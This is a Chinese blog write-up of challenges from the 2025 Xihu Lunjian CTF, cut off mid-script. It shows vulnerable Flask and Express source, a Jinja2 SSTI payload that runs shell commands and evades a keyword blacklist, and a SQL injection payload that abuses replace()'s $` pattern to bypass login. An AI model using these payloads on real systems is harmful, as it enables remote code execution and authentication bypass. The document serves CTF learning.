@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebRank-l这题一开始看没什么思路，后来通过看响应包发现是python服务器所以想到可能是ssti所以就去试了试，发现在login路由输入payload会在cpass路由中渲染。看看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from flask i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025西湖论剑Wp">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="WebRank-l这题一开始看没什么思路，后来通过看响应包发现是python服务器所以想到可能是ssti所以就去试了试，发现在login路由输入payload会在cpass路由中渲染。看看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from flask i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119125214353.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131022981.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131358031.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131614809.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131903502.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131739135.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119132349042.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119133056348.png">
+<meta property="article:published_time" content="2025-01-19T04:29:52.000Z">
+<meta property="article:modified_time" content="2025-03-05T07:24:36.804Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="CTFWP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119125214353.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2025西湖论剑Wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/26/%E9%97%B2%E8%B0%88/%E5%8D%97%E4%BA%AC%E6%B8%B8%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&text=2025西湖论剑Wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&is_video=false&description=2025西湖论剑Wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025西湖论剑Wp&body=Check out this article: https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&name=2025西湖论剑Wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&t=2025西湖论剑Wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rank-l"><span class="toc-number">1.1.</span> <span class="toc-text">Rank-l</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-or-not"><span class="toc-number">1.2.</span> <span class="toc-text">sqli or not</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%9F%E7%B3%95%E7%9A%84%E7%A3%81%E7%9B%98"><span class="toc-number">2.1.</span> <span class="toc-text">糟糕的磁盘</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ds"><span class="toc-number">3.</span> <span class="toc-text">ds</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easydatalog"><span class="toc-number">3.1.</span> <span class="toc-text">easydatalog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E8%AF%81"><span class="toc-number">3.2.</span> <span class="toc-text">取证</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2025西湖论剑Wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-19T04:29:52.000Z" class="dt-published" itemprop="datePublished">2025-01-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTFWP/" rel="tag">CTFWP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h3><p>这题一开始看没什么思路，后来通过看响应包发现是python服务器所以想到可能是ssti所以就去试了试，发现在login路由输入payload会在cpass路由中渲染。看看源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, abort  </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line">phone = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_input</span>(<span class="params">user_input</span>):  </span><br><span class="line">    <span class="comment"># unsafe_keywords = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;os&#x27;, &#x27;system&#x27;, &#x27;import&#x27;, &#x27;__import__&#x27;]  </span></span><br><span class="line">    unsafe_keywords = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;awd&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%2f&#x27;</span>,<span class="string">&#x27;%2F&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> user_input <span class="keyword">for</span> keyword <span class="keyword">in</span> unsafe_keywords):  </span><br><span class="line">    <span class="comment"># if user_input in unsafe_keywords:  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():  </span><br><span class="line">    <span class="keyword">global</span> phone  </span><br><span class="line">    phone = request.form.get(<span class="string">&quot;phone_number&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cpass&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():  </span><br><span class="line">    <span class="keyword">global</span> phone  </span><br><span class="line">    password = request.form.get(<span class="string">&quot;password&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> is_safe_input(phone):  </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> phone != <span class="string">&quot;1686682318&quot;</span> <span class="keyword">and</span> password != <span class="string">&quot;Happy_news_admin&quot;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;!DOCTYPE html&gt;\  </span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;\  </span></span><br><span class="line"><span class="string">        &lt;head&gt;\  </span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;\  </span></span><br><span class="line"><span class="string">            &lt;title&gt;login failed&lt;/title&gt;\  </span></span><br><span class="line"><span class="string">        &lt;/head&gt;\  </span></span><br><span class="line"><span class="string">        &lt;body&gt;\  </span></span><br><span class="line"><span class="string">            &lt;script&gt;alert(&quot;&#123;&#125;The number does not exist or the password is incorrect!&quot;) &lt;/script&gt;\  </span></span><br><span class="line"><span class="string">            &lt;script&gt;window.location.href = &quot;/&quot;;&lt;/script&gt;\  </span></span><br><span class="line"><span class="string">        &lt;/body&gt;\  </span></span><br><span class="line"><span class="string">        &lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(phone))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="built_in">int</span>(<span class="string">&quot;5005&quot;</span>), debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>从源码中也能看出来是在cpass中渲染的，所以这里就只需要绕过黑名单就可以了</p>
+<p>直接上payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> cycler.<span class="built_in">next</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cd ..;ls&#x27;</span>).read()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">print</span> cycler.<span class="built_in">next</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;CD ..;NL FLAGF149&#x27;</span>.lower()).read()%&#125;<span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h3><p>先看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);  </span><br><span class="line">var router = express.Router();  </span><br><span class="line">module.exports = router;  </span><br><span class="line">  </span><br><span class="line">router.get(&#x27;/&#x27;,(req,res,next)=&gt;&#123;  </span><br><span class="line">    if(req.query.info)&#123;  </span><br><span class="line">        if(req.url.match(/\,/ig))&#123;  </span><br><span class="line">            res.end(&#x27;hacker1!&#x27;);  </span><br><span class="line">        &#125;  </span><br><span class="line">        var info = JSON.parse(req.query.info);  </span><br><span class="line">        if(info.username&amp;&amp;info.password)&#123;  </span><br><span class="line">            var username = info.username;  </span><br><span class="line">            var password = info.password;  </span><br><span class="line">            if(info.username.match(/\&#x27;|\&quot;|\\/) || info.password.match(/\&#x27;|\&quot;|\\/))&#123;  </span><br><span class="line">                res.end(&#x27;hacker2!&#x27;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            var sql = &quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;;  </span><br><span class="line">            sql = sql.replace(&quot;&#123;username&#125;&quot;,username);  </span><br><span class="line">            sql = sql.replace(&quot;&#123;password&#125;&quot;,password);  </span><br><span class="line">            connection.query(sql,function (err,rs) &#123;  </span><br><span class="line">            if (err) &#123;  </span><br><span class="line">                res.end(&#x27;error1&#x27;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            else &#123;  </span><br><span class="line">                if(rs.length&gt;0)&#123;  </span><br><span class="line">                res.sendFile(&#x27;/flag&#x27;);  </span><br><span class="line">                &#125;else &#123;  </span><br><span class="line">                res.end(&#x27;username or password error&#x27;);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            &#125;)  </span><br><span class="line">        &#125;  </span><br><span class="line">        else&#123;  </span><br><span class="line">            res.end(&quot;please input the data&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line"> &#125;else&#123;  </span><br><span class="line">        res.end(&quot;please input the data&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这题其实刚开始看的时候以为是考点是sql注入但是发现过滤了 \ “ ‘ ,等导致找了很多资料也不知道怎么绕，结束之后才发现考点其实在replace这个函数上，可以参考：<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch</a></p>
+<p>主要利用的是</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119125214353.png" class="">
+
+<p>可以看到这里的 <font>$&#96;</font> 直接看解释可能有点抽象看一下调试就明白了</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131022981.png" class="">
+<p>可以看到已经闭合了前面的’所以就可以直接构造sql万能绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;$` or 1--+&quot;%2c&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="糟糕的磁盘"><a href="#糟糕的磁盘" class="headerlink" title="糟糕的磁盘"></a>糟糕的磁盘</h3><p>这题其实用取证大师可以直接梭哈出来key.png 和 一个secret然后用Veracrypt解密即可。这里还学到了一个新的工具</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131358031.png" class="">
+<p>这个也可以直接扫描出来进行磁盘取证。</p>
+<h2 id="ds"><a href="#ds" class="headerlink" title="ds"></a>ds</h2><h3 id="easydatalog"><a href="#easydatalog" class="headerlink" title="easydatalog"></a>easydatalog</h3><p>这题的话就是日志分析套了一层图片隐写，先分析日志</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131614809.png" class="">
+
+<p>这里可以看到是jpg图片，然后通过对前面的🐜剑数据解密得到是一个password.jpg所以对其进行单图忙水印即可得到一个密码</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131903502.png" class="">
+
+<p>在下面还有一个压缩包</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119131739135.png" class="">
+
+<p>将上图的密码解压可得到csv文件直接搜索张三即可获取其身份证和手机号。</p>
+<h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h3><p>这题没时间做了但是还是比较简单的，可以直接用lovelymem集成的vol工具进行内存分析</p>
+<p>直接看控制台输出</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119132349042.png" class="">
+
+<p>很容易能够想到去把这几个文件导出来进行解密还原</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">hackkey = os.getenv(<span class="string">&#x27;hackkey&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hackkey:</span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Environment variable &#x27;hackkey&#x27; is not set&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">private_key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey().export_key()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">aes_key = hashlib.sha256(hackkey.encode()).digest()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">cipher_aes = AES.new(aes_key, AES.MODE_EAX)</span><br><span class="line"></span><br><span class="line">ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class="line"></span><br><span class="line">cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))</span><br><span class="line"></span><br><span class="line">enc_aes_key = cipher_rsa.encrypt(aes_key)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted_data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">f.write(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_aes_key.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span 